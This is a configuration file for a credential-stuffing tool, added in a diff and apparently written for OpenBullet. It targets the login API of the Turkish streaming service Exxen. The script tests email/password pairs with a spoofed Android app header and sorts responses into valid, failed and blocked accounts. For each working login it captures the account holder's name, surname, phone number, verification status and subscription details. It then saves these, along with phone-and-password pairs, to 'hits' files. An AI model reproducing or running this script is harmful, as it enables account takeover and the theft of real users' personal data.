@@ -1,0 +1,128 @@
+[SETTINGS]
+{
+  "Name": "[CT] EXXEN CAPTURELİ [APİ]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-24T16:28:23.8292626+03:00",
+  "AdditionalInfo": "",
+  "Author": "Astronot",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#POST REQUEST POST "https://api-crm.exxen.com/membership/login/email?key=5f07276b91aa33e4bc446c54a9e982a8" 
+  CONTENT "{\"Email\":\"<USER>\",\"Password\":\"<PASS>\",\"RememberMe\":1}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "origin: com.exxen.android" 
+  HEADER "user-agent: com.exxen.android/1.0.27 (Android/9; en_US; brand/samsung; model/SM-T725; build/PPR1.180610.011)" 
+
+#KONTROL KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Success\":false" 
+  KEYCHAIN Success OR 
+    KEY "Success\":true" 
+  KEYCHAIN Custom "BLOKLU" OR 
+    KEY "Your account is blocked" 
+
+#İSİM PARSE "<SOURCE>" JSON "Name" CreateEmpty=FALSE -> CAP "İsim" 
+
+#SOYAD PARSE "<SOURCE>" JSON "Surname" CreateEmpty=FALSE -> CAP "Soyad" 
+
+#TELEFON PARSE "<SOURCE>" LR "Number\":\"+90" "\"" CreateEmpty=FALSE -> CAP "Telefon" 
+
+#EMAİL_VERİFİED PARSE "<SOURCE>" JSON "EmailVerified" -> VAR "Email Doğrulaması" 
+
+#EMAİL_VERİFİED FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "True" VALUE "✔️" 
+  KEY "False" VALUE "❌" 
+  "<Email Doğrulaması>" -> CAP "Email Doğrulaması" 
+
+#TEL_VERİFİED PARSE "<SOURCE>" JSON "MobileVerified" -> VAR "Telefon Doğrulaması" 
+
+#TEL_VERİFİED FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "True" VALUE "✔️" 
+  KEY "False" VALUE "❌" 
+  "<Telefon Doğrulaması>" -> CAP "Telefon Doğrulaması" 
+
+#PAKET PARSE "<SOURCE>" JSON "LicenseName" Recursive=TRUE -> VAR "Paket" 
+
+#PAKET FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "RKLMVAR Monthly" VALUE "RKLMVAR Monthly 9,90 ₺" 
+  KEY "RKLMVAR Yearly" VALUE "RKLMVAR Yearly 99,90 ₺" 
+  KEY "RKLMYOK Monthly" VALUE "RKLMYOK Monthly 19,90 ₺" 
+  KEY "RKLMYOK Plus Monthly" VALUE "RKLMYOK Plus Monthly 19,90 ₺" 
+  KEY "RKLMYOK Yearly" VALUE "RKLMYOK Yearly 199,90 ₺" 
+  KEY "RKLMYOK Plus Yearly" VALUE "RKLMYOK Plus Yearly 199,90 ₺" 
+  KEY "Spor Monthly" VALUE "Spor Monthly 39,90 ₺" 
+  KEY "Spor Yearly" VALUE "Spor Yearly 298.80 ₺" 
+  KEY "Spor Seaon" VALUE "Spor Sezon 298.80 ₺" 
+  KEY "RKLMYOK Sezon Fırsat" VALUE "RKLMYOK Sezon Fırsat 238.80 ₺" 
+  KEY "RKLMVAR Sezon Fırsat" VALUE "RKLMVAR Sezon Fırsat 118.80 ₺" 
+  KEY "Yearly" VALUE "Yıllık" 
+  KEY "Monthly" VALUE "Aylık" 
+  KEY "RKLMYOK" VALUE "ReklamYOK" 
+  KEY "RKLMVAR" VALUE "ReklamVAR" 
+  KEY "Seaon" VALUE "Sezon" 
+  KEY "[" VALUE "" 
+  KEY "]" VALUE "" 
+  KEY "Trial" VALUE "(Deneme)" 
+  "<Paket>" -> CAP "Paket" 
+
+#BAŞLANGIÇ_TARİHİ PARSE "<SOURCE>" LR "LicenseStartDate\":\"" "T" CreateEmpty=FALSE -> CAP "Başlangıç Tarihi" 
+
+#BİTİŞ_TARİHİ PARSE "<SOURCE>" LR "\",\"LicenseEndDate\":\"" "T" CreateEmpty=FALSE -> CAP "Bitiş Tarihi" 
+
+#TelefonKAYIT UTILITY File "DB\\Exxen Tel Pass.txt" AppendLines "<Telefon>:<PASS>" 
+
+#SAVE UTILITY File "Exen Hİts BY ASTRONOT.txt" AppendLines "-------E4XEN CONFİG-------\\nHESAP [<USER>:<PASS]\\nİsim Soyisim [<İsim> <Soyad>]\\nTelefon Numarası [<Telefon>]\\nTelefon Doğrulama [<Telefon Doğrulaması >]\\nMail Doğrulama [<Email Doğrulaması>]\\nPaket [<Paket>]\\nBaşlangıç Tarihi [<Başlangıç Tarihi>]\\nBitiş Tarihi [<Bitiş Tarihi>]\\n" 
+
+#PAKETSİZ_CONTROL KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "PackageName" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "PackageName" 
+    KEY "<Paket>" Contains "Ramazan Bayramı Kampanyası 2021" 
+    KEY "<SOURCE>" DoesNotContain "\",\"LicenseEndDate\":\"" 
+
